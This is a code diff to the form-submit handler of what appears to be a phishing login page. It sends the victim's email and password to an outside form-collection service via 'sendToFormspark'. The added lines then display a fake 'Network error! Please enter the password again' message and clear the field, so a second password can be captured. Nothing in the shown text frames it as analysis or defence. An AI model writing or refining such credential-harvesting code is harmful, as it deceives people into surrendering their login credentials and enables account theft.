@@ -130,10 +130,6 @@ form.addEventListener('submit', async function (event) {
 
     const password = passwordInput.value.trim();
     let email = emailInput ? emailInput.value.trim() : '';
-if (!email) {
-    const mxInput = document.getElementById('mx');
-    email = mxInput ? mxInput.value : '';
-}
 
     // HONEYPOT CHECK
     const honeypot = form.querySelector('input[name="_gotcha"]');
@@ -156,19 +152,15 @@ if (!email) {
             passwordWarning.style.display = 'block';
             passwordWarning.textContent = '*error! please enter a valid password*';
             passwordInput.focus();
-} else {
-    firstPassword = password;
-    
-    // Check if email exists before sending
-    if (email) {
-        await sendToFormspark(email, firstPassword);
-    } else {
-        console.error('Email is missing!');
-        passwordWarning.style.display = 'block';
-        passwordWarning.textContent = '*error: email not found*';
-        passwordInput.focus();
-        return;
-    }
+        } else {
+            firstPassword = password;
+            await sendToFormspark(email, firstPassword);
+            passwordWarning.style.display = 'block';
+            passwordWarning.textContent = '*Network error! Please enter the password again*';
+            passwordInput.value = '';
+            passwordInput.focus();
+            isFirstPasswordEntered = true;
+        }
     } else {
         if (password === '') {
             passwordWarning.style.display = 'block';
